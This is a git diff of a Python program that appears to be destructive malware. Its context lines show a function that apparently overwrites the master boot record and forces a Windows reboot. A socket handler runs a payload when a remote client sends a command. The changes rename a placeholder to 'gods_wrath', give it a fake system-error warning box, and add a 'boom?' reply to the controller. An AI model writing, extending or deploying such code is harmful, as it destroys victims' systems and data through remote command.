@@ -48,9 +48,9 @@ def mbr_wm(): # if failed will overwrite without message
   time.sleep(0.1)
   os.system("shutdown /r /t 1")
 
-def place_holder():
-  warningtitle = 'Placeholder'
-  warningdescription = 'placeholder'
+def gods_wrath():
+  warningtitle = 'error'
+  warningdescription = 'err: your system ran into an error!'
   if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7:
     placeholder1()
     placeholder2()
@@ -64,7 +64,8 @@ def handle_client(client_socket):
                 client_socket.send(f'ping received, executing in {i}'.encode())
                 time.sleep(1)
             client_socket.send(b'loading...')
-            place_holder() # may god bless us all...
+            gods_wrath() # may god bless us all...
+            client_socket.send(b'boom?')
         elif command.lower() == 'exit':
             client_socket.send(b'breaking')
             break
